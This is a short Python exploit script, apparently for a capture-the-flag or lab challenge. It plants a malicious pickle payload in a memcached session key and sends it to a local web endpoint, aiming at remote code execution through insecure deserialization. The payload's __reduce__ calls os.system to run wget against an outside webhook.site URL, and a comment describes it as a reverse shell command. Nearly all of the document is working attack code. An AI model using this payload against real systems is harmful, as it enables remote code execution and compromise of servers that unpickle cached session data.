import pickle
import os
from pymemcache.client.base import Client
from pymemcache.exceptions import (
    MemcacheError,
    MemcacheClientError,
    MemcacheServerError,
    MemcacheUnknownError,)
import urllib.parse
import requests as r
import base64

MC_ERR = (MemcacheError, MemcacheClientError, MemcacheServerError, MemcacheUnknownError)
 
victim = "localhost"

url = "http://localhost:1337/set"

class RCE:
    def __reduce__(self):
        # reverse shell command string
        cmd = f"wget https://webhook.site/4620a451-301d-4dc2-8018-7e373d2d04b8"
        # __reduce__ returns a tuple of callable and tuple of arguments of the callable
        return os.system, (cmd,)
 
 
if __name__ == '__main__':
    try:
        # create a memcache client object
        mc = Client(f"{victim}:11211")
        # Set a key you_have_been_pwned with serialized data of the reverse shell command.
        mc.set("session:17b05099-c143-45b2-adad-6e2e97d62105", pickle.dumps(RCE()))

        value = mc.get('session:17b05099-c143-45b2-adad-6e2e97d62105')

        print(value)

        response = r.get(url, cookies={"session":"test"}, params={'uicolor': value.decode('unicode_escape')}, allow_redirects=True)

        print(response.headers)

    except MC_ERR as e:
        print(e)